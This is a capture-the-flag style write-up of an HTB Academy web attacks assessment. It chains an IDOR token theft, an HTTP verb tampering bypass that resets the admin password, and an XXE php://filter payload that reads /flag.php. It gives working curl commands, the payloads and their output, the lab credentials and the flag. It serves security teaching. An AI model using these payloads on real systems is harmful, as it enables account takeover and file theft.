# HTB Academy — Web Attacks Skills Assessment

**Flag:** `HTB{m4573r_w3b_4774ck3r}`  
**Target:** `154.57.164.63:30310`  
**Credentials:** `htb-student` / `Academy_student!`

---

## Scenario

Social networking web application. Goal: escalate privileges and read `/flag.php`.

---

## Attack Chain

Three vulnerabilities chained in sequence: IDOR → HTTP Verb Tampering → XXE.

---

### Step 1 — Reconnaissance

Logged in and read the JS source on `profile.php`:

```javascript
fetch(`/api.php/user/${$.cookie("uid")}`, { method: 'GET' })
```

And on `settings.php` (password reset flow):

```javascript
fetch(`/api.php/token/${$.cookie("uid")}`, { method: 'GET' })
// then POST to /reset.php with uid + token + password
```

Our uid = 74 (from the cookie). Two IDOR candidates: `/api.php/user/<uid>` and `/api.php/token/<uid>`.

---

### Step 2 — IDOR: Steal Admin Token

Enumerated all users via `/api.php/user/<uid>`:

```bash
for i in {1..100}; do
    result=$(curl -s -b cookies.txt "http://154.57.164.63:30310/api.php/user/$i")
    [ -n "$result" ] && echo "uid=$i: $result"
done
```

Found uid=52: `{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}`

Token endpoint has no access control — fetched uid=52's token as uid=74:

```bash
curl -s -b cookies.txt "http://154.57.164.63:30310/api.php/token/52"
# {"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
```

---

### Step 3 — HTTP Verb Tampering: Bypass Reset Auth

POST to `/reset.php` with uid=52 returned "Access Denied" — server validated that the session uid matched the POST uid.

`reset.php` likely checks `$_POST['uid']` against the session but executes via `$_REQUEST['uid']`. Sending the parameters via GET bypassed the check entirely:

```bash
curl -s -b cookies.txt \
  "http://154.57.164.63:30310/reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=hacked123"
# Password changed successfully
```

Logged in as `a.corrales` / `hacked123`.

---

### Step 4 — XXE: Read /flag.php

Admin profile has an extra link: `/event.php`. The page JS constructs XML from user input and POSTs to `addEvent.php`:

```javascript
var xml = `<root><name>${name}</name><details>${details}</details><date>${date}</date></root>`;
fetch('addEvent.php', { method: 'POST', body: xml });
```

Confirmed entity injection via test entity in `name` field:

```bash
curl -s -b cookies_admin.txt -X POST http://154.57.164.63:30310/addEvent.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe "TESTVALUE">]><root><name>&xxe;</name><details>x</details><date>x</date></root>'
# Event 'TESTVALUE' has been created.
```

Read `/flag.php` via php://filter (PHP file needs base64 to avoid XML parse errors on `<?php` tags):

```bash
curl -s -b cookies_admin.txt -X POST http://154.57.164.63:30310/addEvent.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">]><root><name>&xxe;</name><details>x</details><date>x</date></root>'
# Event 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' has been created.

echo "PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K" | base64 -d
# <?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?>
```

---

## Key Lessons

1. **Read JS source immediately** — both IDOR endpoints and the XML submission pattern were only visible in the JS, not the HTML forms.

2. **IDOR on token endpoint** — the `/api.php/token/<uid>` endpoint returned any user's reset token with no ownership check. Always test every API endpoint for IDOR, not just profile reads.

3. **HTTP Verb Tampering on access control** — when POST is denied, try GET with the same params. The filter checked `$_POST['uid']` but `$_REQUEST` aggregates GET+POST, so GET bypassed auth entirely.

4. **Admin-only pages unlock new attack surface** — `/event.php` only appeared for the admin user. Always re-enumerate pages after privilege escalation.

5. **php://filter for PHP file reads** — direct `file:///flag.php` would have failed because `<?php` tags break XML parsing. Base64 wrapping via `php://filter/convert.base64-encode` is the standard fix.

6. **Attack chain order mattered** — IDOR alone gave a token but not access; verb tampering alone was blocked without the right token; XXE was only reachable as admin. All three had to land in sequence.
